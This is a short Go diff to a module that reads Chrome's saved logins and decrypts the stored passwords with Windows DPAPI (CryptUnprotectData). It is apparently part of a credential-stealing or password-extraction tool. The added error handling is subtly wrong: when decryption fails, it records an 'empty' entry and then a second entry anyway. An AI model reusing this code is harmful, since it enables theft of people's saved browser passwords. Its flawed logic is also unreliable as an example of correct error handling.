@@ -59,7 +59,14 @@ func chromeModuleStart(path string) ([]common.UrlNamePass, bool) {
 					Chromium browser use default win cryptapi function named "CryptProtectData" for encrypting saved credentials.
 					Read about DPAPI for more information.
 				*/
-				data = append(data, common.UrlNamePass{actionUrl, username, common.Win32CryptUnprotectData(password, false)})
+
+				decryptedPassword, errUnprotectData := common.Win32CryptUnprotectData(password, false)
+
+				if errUnprotectData != nil {
+					data = append(data, common.UrlNamePass{Url: actionUrl, Username: username, Pass: "empty"})
+				}
+
+				data = append(data, common.UrlNamePass{Url: actionUrl, Username: username, Pass: string(decryptedPassword)})
 			}
 
 			// remove already used database
